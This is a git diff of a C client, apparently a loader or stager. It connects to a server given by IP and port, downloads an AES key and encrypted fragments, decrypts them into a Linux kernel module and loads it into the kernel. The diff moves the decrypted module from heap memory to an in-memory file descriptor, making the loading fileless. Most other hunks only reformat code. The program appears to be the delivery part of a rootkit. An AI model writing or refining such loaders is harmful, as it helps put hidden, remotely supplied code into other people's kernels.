@@ -94,7 +94,8 @@ static uint8_t *get_aes_key(int sfd, size_t *key_length) {
   return aes_key;
 }
 
-static fraction_t *fetch_fractions(int sfd, int *fraction_count, char *ip_address, char* port) {
+static fraction_t *fetch_fractions(int sfd, int *fraction_count,
+                                   char *ip_address, char *port) {
   http_res_t http_fraction_res = {0};
 
   fraction_t *fractions = NULL;
@@ -158,8 +159,10 @@ static bool validate_port(const char *port) {
 
   portl = strtol(port, NULL, 10);
 
-  if (errno != 0) return false;
-  if (portl < 0 || portl > USHRT_MAX) return false;
+  if (errno != 0)
+    return false;
+  if (portl < 0 || portl > USHRT_MAX)
+    return false;
 
   return true;
 }
@@ -170,6 +173,7 @@ int main(int argc, char **argv) {
   char *port;
 
   int sfd = -1; // to be extra professional
+  int memfd = -1;
 
   unsigned char *aes_key = NULL;
   size_t key_len = 0;
@@ -177,11 +181,7 @@ int main(int argc, char **argv) {
   fraction_t *fractions = NULL;
   int fraction_count;
 
-  uint8_t *module = NULL;
-  ssize_t module_size;
-
-
-  if(argc != 3){
+  if (argc != 3) {
     log_error("Usage: ./client IP PORT");
     goto cleanup;
   }
@@ -196,7 +196,8 @@ int main(int argc, char **argv) {
   }
 
   if (!validate_port(port)) {
-    log_error("Invalid port, should be a number in the range (0-%d)", USHRT_MAX);
+    log_error("Invalid port, should be a number in the range (0-%d)",
+              USHRT_MAX);
     goto cleanup;
   }
 
@@ -211,7 +212,7 @@ int main(int argc, char **argv) {
   log_set_level(LOG_DEBUG);
 
   /* open a connection to the server */
-  sfd = do_connect(ip_address,port);
+  sfd = do_connect(ip_address, port);
   if (sfd < 0) {
     goto cleanup;
   }
@@ -223,7 +224,7 @@ int main(int argc, char **argv) {
   }
 
   /* download and sort the fractions*/
-  fractions = fetch_fractions(sfd, &fraction_count,ip_address, port);
+  fractions = fetch_fractions(sfd, &fraction_count, ip_address, port);
   if (fractions == NULL) {
     goto cleanup;
   }
@@ -231,35 +232,37 @@ int main(int argc, char **argv) {
   log_info("Downloaded fractions");
 
   /* decrypt the fractions and assemble the LKM */
-  module = decrypt_lkm(fractions, fraction_count, &module_size, aes_key);
-  if (module == NULL) {
-    log_error("There was an error creating the module");
+
+  memfd = decrypt_lkm(fractions, fraction_count, aes_key);
+  if (memfd < 0) {
+    log_error("There was an error decrypting the module");
     cleanup_fraction_array(fractions, fraction_count);
     goto cleanup;
   }
 
-  /* load the LKM in the kernel */
-  if (load_lkm(module, module_size) < 0) {
-    log_error("Error loading LKM");
+  if (load_lkm(memfd) == -1) {
+    log_error("Failed to load LKM");
     goto cleanup;
   }
 
   /* cleanup */
   close(sfd);
+  close(memfd);
   cleanup_fraction_array(fractions, fraction_count);
-  free(module);
   free(aes_key);
 
   return EXIT_SUCCESS; // hooray!!!
 
   /* Encapsulate cleanup */
 cleanup:
-  if (sfd != -1) close(sfd);
-  if (fractions) cleanup_fraction_array(fractions, fraction_count);
+  if (sfd >= 0)
+    close(sfd);
+  if (memfd >= 0)
+    close(memfd);
+  if (fractions)
+    cleanup_fraction_array(fractions, fraction_count);
 
-  free(module);
   free(aes_key);
 
   return EXIT_FAILURE;
-
 }
